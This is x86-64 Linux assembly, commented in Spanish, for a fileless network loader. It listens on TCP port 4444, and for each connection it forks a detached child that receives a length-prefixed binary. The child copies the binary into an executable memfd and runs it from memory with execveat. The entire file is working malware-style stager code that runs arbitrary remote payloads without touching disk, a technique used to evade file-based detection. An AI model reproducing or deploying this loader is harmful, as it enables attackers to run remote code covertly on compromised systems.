section .data

    memfd_name db '', 0    ; Nombre del memfd
    exec_path db '', 0     ; Empty path para que execveat ejecute FD

    ; Argumentos para definir las propiedades del socket
    ; struct sockaddr_in (16 bytes)
    sockaddr_in:
        dw 2                ; sin_family = AF_INET
        dw 0x5C11           ; sin_port = 4444 (big-endian: 0x115C → bytes 5C 11)
        dd 0x0100007F       ; sin_addr = 127.0.0.1 (big-endian: 0x7f000001 → bytes 01 00 00 7F)
        dq 0                ; sin_zero (padding)

    ; Argumentos para definir el clonado del proceso
    ; struct clone_args (88 bytes)
    clone_args:
        dq 0                ; flags     CLONE_PIDFD = 0x00001000
        dq 0                ; Puntero donde almacenar el pidfd (si CLONE_PIDFD)
        dq 0                ; Puntero donde escribir el TID del hijo (si CLONE_CHILD_SETTID)
        dq 0                ; Puntero donde escribir el TID en el padre (si CLONE_PARENT_SETTID)
        dq 17               ; Señal a enviar al padre cuando el hijo termina (ej: SIGCHLD = 17)
        dq 0                ; Dirección base de la pila del hijo
        dq 0                ; Tamaño de la pila del hijo
        dq 0                ; Puntero a la estructura TLS (si CLONE_SETTLS)
        dq 0                ; Puntero a array de PIDs forzados por namespace
        dq 0                ; Número de elementos en set_tid
        dq 0                ; FD de cgroup destino (si CLONE_INTO_CGROUP)

section .bss
    buff_lg: resq 1    ; Buffer donde almacenar el tamaño del fichero (64 bits)
section .text

global _start
_start: 

; 1 - Creación del socket en modo escucha

    ; SOCKET
    mov rax, 41   ; Número de syscall (socket)
    mov rdi, 2    ; Familia de direcciones (AF_*)
    mov rsi, 1    ; Tipo de socket (SOCK_*), opcionalmente OR con flags
    xor rdx, rdx  ; Protocolo (0 = por defecto)
    syscall 

    ; ----------------------------------
    mov r12, rax   ; FD del socket    -
    ; ----------------------------------

    ; BIND
    mov rax, 49                  ; Número de syscall (bind)
    mov rdi, r12                 ; File Descriptor del socket 
    lea rsi, [rel sockaddr_in]   ; Puntero a struct sockaddr con la dirección local
    mov rdx, 16                  ; Tamaño de la estructura de dirección en bytes
    syscall


    ;LISTEN
    mov rax, 50           ; Número de syscall (listen)
    mov rdi, r12          ; File Descriptor del socket
    mov rsi, 1            ; Tamaño máximo de la cola de conexiones pendientes
    syscall

accept_loop:

    ;ACCEPT
    mov rax, 43    ; Número de syscall (accept)
    mov rdi, r12   ; Descriptor del socket en escucha (tras bind + listen)
    xor rsi, rsi   ; Puntero a struct sockaddr donde se almacenará la dirección del cliente (o NULL)
    xor rdx, rdx   ; Puntero a socklen_t con el tamaño del buffer addr (o NULL)
    syscall

    ; ----------------------------------------
    mov r13, rax  ; FD del socket conectado  -
    ; ----------------------------------------


; 2 - Creación del proceso hijo y desvinculación del padre

    ; CLONE3
    mov rax, 435                  ; Número de syscall (clone3)
    lea rdi, [rel clone_args]     ; Puntero a struct clone_args
    mov rsi, 88                   ; Tamaño de la estructura clone_args
    syscall

    cmp rax, 0
    jg accept_loop

    ; SETSID
    mov rax, 112    ; Número de syscall (setsid)
    syscall


; 3 - Recepción del tamaño en bytes del fichero

    xor r15, r15   ; R15 - Contiene el offset de la región de memoria compartida
    xor rax, rax

recv_lg:

    add r15, rax

    ;RECVFROM
    mov rax, 45             ; Número de syscall (recvfrom)
    mov rdi, r13            ; Descriptor del socket
    lea rsi, [rel buff_lg]  ; Dirección del buffer donde almacenar datos
    add rsi, r15
    mov rdx, 8              ; Tamaño máximo del buffer (bytes a recibir)
    sub rdx, r15
    xor r10, r10            ; Flags de recepción (MSG_*)
    xor r8, r8              ; Puntero a struct sockaddr (o NULL)
    xor r9, r9              ; Puntero a socklen_t (o NULL)
    syscall

    cmp rax, 0
    jg recv_lg


; 4 - Creación del fichero en tempfs por parte del hijo

    ;MEMFD_CREATE
    mov rax, 319                   ; Número de syscall (memfd_create)
    lea rdi, [rel memfd_name]      ; Puntero a C-string con el nombre (informativo)
    mov rsi, 0x0010                ; Flags de comportamiento (MFD_*)  MFD_EXEC = 0x0010
    syscall

    ; --------------------------------
    mov r14, rax   ; FD del memfd    -
    ; --------------------------------


; 5 - Preexpanción del fichero en tempfs al tamaño necesario (relleno a 0)

    ; FTRUNCATE
    mov rax, 77              ; Número de syscall (ftruncate)
    mov rdi, r14             ; Descriptor de archivo
    mov rsi, [buff_lg]       ; Nuevo tamaño en bytes
    syscall

; mmap con MAP_SHARED sobre un fd mapea páginas reales del fichero. 
; Si el fichero mide 0 bytes no hay páginas que mapear, el kernel rechaza la operación. 
; ftruncate preexpande el fichero al tamaño necesario, reservando esas páginas en tmpfs, 
; para que mmap tenga algo concreto sobre lo que operar. 

; 6 - Crear región de memoria compartida entre el proceso hijo y el fichero en tempfs

    ;MMAP
    mov rax, 9          ; Número de syscall (mmap)
    mov rdi, 0          ; Dirección sugerida (0 para que el SO lo elija)
    mov rsi, [buff_lg]  ; Tamaño en bytes a reservar (ej. 4096 = 1 página)
    mov rdx, 3          ; Permisos de protección (flags PROT_*)  PROT_READ | PROT_WRITE = 0x3
    mov r10, 1          ; Opciones de mapeo (MAP_*)  MAP_SHARED  = 0x01
    mov r8, r14         ; File descriptor (para mapeo de archivo; -1 si no aplica)
    mov r9, 0           ; Offset dentro del archivo (múltiplo del tamaño de página)
    syscall


; 7 - Se escribe el contenido recibido en la región de memoria compartida

    xor r12, r12
    mov r12, rax   ; RAX - Contiene la dirección base del bloque de memoria reservado
    xor r15, r15   ; R15 - Contiene el offset de la región de memoria compartida
    xor rax, rax

recv_all:

    add r15, rax

    ;RECVFROM
    mov rax, 45           ; Número de syscall (recvfrom)
    mov rdi, r13          ; Descriptor del socket
    mov rsi, r12          ; Dirección del buffer donde almacenar datos
    add rsi, r15
    mov rdx, [buff_lg]    ; Tamaño máximo del buffer (bytes a recibir)
    sub rdx, r15
    xor r10, r10          ; Flags de recepción (MSG_*)
    xor r8, r8            ; Puntero a struct sockaddr (o NULL)
    xor r9, r9            ; Puntero a socklen_t (o NULL)
    syscall

    cmp rax, 0
    jg recv_all

; 8 - Se desvincula al proceso hijo de la región de memoria compartida

    ; MUNMAP
    mov rax, 11          ; Número de syscall (munmap)
    mov rdi, r12         ; Dirección base del mapping a eliminar
    mov rsi, [buff_lg]   ; Tamaño en bytes a desmapear
    syscall


; 9 - Se ejecuta el contenido del fichero en tempfs

    ;EXECVEAT
    mov rax, 322              ; Número de syscall (execveat)
    mov rdi, r14              ; Descriptor de directorio base (o AT_FDCWD, o FD del ejecutable)
    lea rsi, [rel exec_path]  ; Puntero a C-string con la ruta (puede ser "")
    xor rdx, rdx              ; Puntero a array de punteros a C-string (terminado en NULL)
    xor r10, r10              ; Puntero a array de punteros a C-string (terminado en NULL)
    mov r8, 0x1000            ; Flags de resolución (AT_*) AT_EMPTY_PATH = 0x1000
    syscall


exit:
    ; EXIT
    mov rax, 60
    xor rdi, rdi  
    syscall


